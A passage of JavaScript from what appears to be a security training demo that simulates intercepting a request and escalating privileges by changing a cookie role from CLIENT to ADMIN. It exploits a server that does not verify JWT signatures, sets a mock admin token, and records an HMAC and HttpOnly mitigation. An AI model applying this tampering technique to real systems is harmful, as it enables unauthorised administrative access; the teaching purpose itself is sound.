        tLog(`[+] EXPLOIT EXITOSO: Privilege Escalation completado.`, 'green');
        tLog(`[+] El servidor V1 NO valida la firma del JWT → acepta el rol modificado.`, 'green');
        tLog(`[+] Acceso administrativo total conseguido.`, 'green');

        addEvidence('🔴 Privilege Escalation', `Original:  role=CLIENT (usuario normal)\nModificado: role=ADMIN (administrador)\n\nVector: Cookie tampering + JWT sin validación de firma\nImpacto: Acceso total al panel SOC, datos de todos los clientes, y control del sistema.\n\n[MITIGACIÓN v2]: Firma HMAC-SHA256 + HttpOnly cookies`, 'red');

        const res = tLog(`[*] Acción: `, 'cyan');
        addAction(res, 'Acceder como Admin', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
            localStorage.setItem('sofia_token_v1', 'STOLEN_ADMIN_TOKEN_MOCK');
            localStorage.setItem('sofia_user_v1', JSON.stringify({id:1, email:'admin@sofia.local', role:'ADMIN'}));
            window.location.href = '/admin';
        });
    } else {
        tLog(`[-] Petición enviada sin modificaciones. El servidor responde con rol CLIENT.`, 'red');
        tLog(`[-] Para escalar privilegios, cambia "role=CLIENT" por "role=ADMIN" en la cookie.`, 'dim');
    }
}

function await_delay_sync(ms) { /* non-blocking visual placeholder */ }

function dropRequest() {
    document.getElementById('burp-suite').style.display = 'none';
    tLog(`[-] Petición descartada (Drop). La víctima recibirá un timeout.`, 'dim');
}
</script>

<style>
@keyframes slideIn { from { transform: translateX(20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
@keyframes slideDown { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
</style>
